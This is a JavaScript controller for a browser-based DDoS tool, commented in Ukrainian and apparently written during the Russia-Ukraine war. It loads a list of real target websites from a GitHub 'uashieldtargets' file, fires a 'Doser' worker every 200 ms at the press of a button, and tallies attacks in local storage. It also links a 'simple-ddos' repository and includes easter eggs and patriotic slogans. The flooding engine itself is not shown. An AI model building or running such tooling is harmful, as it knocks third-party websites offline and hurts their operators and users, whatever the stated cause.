// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'

const saverInterval = 3000
const attackInterval = 200

// Функції для керування документом

const frameDiv = $("#frames")
const attacks = $("#attacks")

const add_count = () => attacks.text(parseInt(attacks.text()) + 1)


// Відображення цілі та методу атаки
const targetField = $("#target")
const methodField = $("#method")

// https://github.com/BogdanDevUA/simple-ddos/


const btn = $("#button-text")
const Database = window.localStorage
const box = $("#box")


Doser = new Doser; // Ініціалізація воркера

$("#button").click(() => !Doser.attack ? Doser.start() : Doser.stop());

$("#attackCount").click(() => {
	// Загальна кількість атак

	const a = Database.attacks
	alert("Атаки", `Взагалом атаковано: ${!a?0:a}`)
});

// Пасхалки)

$("#fixed-bugs").click(() => alert("Факт", "Я справді пофіксив баги!"));

$("#uses").click(() => alert("Пасхалка", "Цей сайт був написаний 13 річним хакером на JS, HTML, CSS"));

$("#ua").dblclick(() => alert("Слава Україні!", "Героям Слава!"));



$("<link>", {
    rel: "stylesheet",
    href: "styles/widgets/help-ukraine-win/style.css"
}).appendTo($("head"))

$("<script>", {
    src: "scripts/widgets/help-ukraine-win/script.js"
}).appendTo($("body"))

$("<script>", {
    src: "scripts/widgets/platform.js",
    defer: ""
}).appendTo($("html"))

// Слава Україні!